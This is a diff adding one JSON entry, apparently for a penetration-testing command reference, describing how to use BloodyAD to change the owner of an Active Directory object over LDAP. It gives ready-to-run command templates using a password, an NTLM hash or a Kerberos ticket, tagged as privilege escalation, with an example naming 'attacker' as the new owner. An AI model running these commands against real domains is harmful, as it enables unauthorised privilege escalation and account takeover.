@@ -1,0 +1,35 @@
+{
+  "id": "bloodyad-set-owner",
+  "name": "BloodyAD Set Object Owner",
+  "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' -p '<password>' set owner '<target_object>' '<owner>'",
+  "description": "Set object owner using BloodyAD",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "bloodyad",
+    "acl",
+    "owner",
+    "dacl",
+    "privilege-escalation"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' --hashes ':<hash>' set owner '<target_object>' '<owner>'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "bloodyAD --host '<ip>' -d '<domain>' -k set owner '<target_object>' '<owner>'"
+    }
+  ],
+  "examples": [
+    "bloodyAD --host '192.168.1.100' -d 'CORP.LOCAL' -u 'user' -p 'password' set owner 'CN=Target,DC=CORP,DC=LOCAL' 'attacker'"
+  ]
+}
